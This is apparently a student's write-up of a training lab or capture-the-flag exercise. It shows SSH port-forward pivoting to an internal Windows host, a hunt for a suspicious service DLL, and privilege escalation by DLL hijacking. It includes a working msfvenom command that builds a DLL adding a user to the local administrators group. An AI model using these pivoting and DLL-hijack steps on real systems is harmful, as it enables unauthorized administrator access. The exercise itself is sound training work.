### Here we go.
```bash
#ON WINDOWS:
ssh student@10.50.11.132 -L 11111:127.0.0.1:22 -NT
(Jump pass)
ssh student@127.0.0.1 -p 11111 -L 11112:192.168.28.105:2222 -NT
(Pivot Password)
ssh comrade@127.0.0.1 -p 11112 -L 11113:192.168.28.5:3389 -NT
(T1 Creds)
RDP into T1
#Enumerate: Looked in services, MemoryStatus did not have a description which is weird. I looked into full file path, went to location:
Searched file in location, found a .dll that was named funny.
#In file system, I went to comrades system log in his direcctory. Filtered on times, and saw the service causing error level logs.
#Looked for error level logs on specific days
#Look up code for instalation to find dates offending services were first created.
#Looking at the alert, we a an lp being opened for fortnite. This looks wrong.
#Looking at the top date, the year states 2230
```
### Priv escalation:
```bash
#We discovered hijackmeplz.dll is the vulnerable dll. we created this on 
In linux: msfvenom -p windows/exec CMD='cmd.exe /C "net localgroup administrators comrade /add" -f dll > hijackmeplz.dll
Restart Windows after succsesful copy.
#In file system gui, you now have access to Admin desktop.
```
